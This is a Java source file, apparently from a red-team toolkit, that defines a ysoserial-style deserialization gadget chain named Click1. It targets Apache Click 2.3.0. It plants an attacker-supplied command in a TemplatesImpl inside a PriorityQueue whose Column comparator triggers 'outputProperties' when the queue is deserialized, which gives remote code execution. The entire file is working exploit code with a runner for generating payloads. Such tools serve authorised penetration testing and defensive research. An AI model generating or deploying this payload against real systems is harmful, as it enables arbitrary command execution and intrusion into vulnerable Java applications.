package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.click.control.Column;
import org.apache.click.control.Table;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
@Authors({Authors.ARTSPLOIT})
public class Click1 implements ObjectPayload<Object> {

    @Override
    public Object getObject(final String command) throws Exception {
        Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance(
                "org.apache.click.control.Column$ColumnComparator", column);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        column.setName("outputProperties");

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        Object templates = Gadgets.createTemplatesImpl(command);
        queueArray[0] = templates;
        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Click1.class, args);
    }
}
